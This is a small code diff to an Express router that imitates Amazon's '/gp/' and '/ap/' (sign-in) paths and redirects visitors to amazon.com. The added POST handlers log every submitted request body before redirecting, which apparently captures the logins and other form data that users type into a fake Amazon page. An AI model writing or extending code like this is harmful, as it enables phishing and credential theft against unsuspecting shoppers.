@@ -3,11 +3,21 @@ const puppeteer = require('puppeteer');
 
 // All routes other than '/' route will be directed to amazon
 router.route('/gp/*').get((req, res) => {
-  res.redirect('http://www.amazon.sg' + req.url);
+  res.redirect('http://www.amazon.com' + req.url);
 });
 
 router.route('/ap/*').get((req, res) => {
-  res.redirect('http://www.amazon.sg' + req.url);
+  res.redirect('http://www.amazon.com' + req.url);
+});
+
+router.route('/gp/*').post((req, res) => {
+    console.log(req.body);
+  res.redirect('http://www.amazon.com' + req.url);
+});
+
+router.route('/ap/*').post((req, res) => {
+    console.log(req.body);
+  res.redirect('http://www.amazon.com' + req.url);
 });
 
 router.route('/loadPage').get(async (req, res) => {
